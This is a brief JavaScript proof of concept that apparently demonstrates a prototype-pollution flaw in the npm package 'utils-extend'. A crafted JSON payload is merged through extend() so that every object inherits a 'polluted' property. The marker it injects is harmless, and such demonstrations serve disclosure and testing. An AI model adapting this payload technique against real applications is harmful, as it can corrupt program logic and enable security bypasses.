const {extend} = require('utils-extend');
const payload = '{"constructor.prototype": {"polluted":"yes"}}';
obj = {};
console.log({}.polluted);
const pollutionObject = JSON.parse(payload);
extend({}, pollutionObject);
console.log({}.polluted);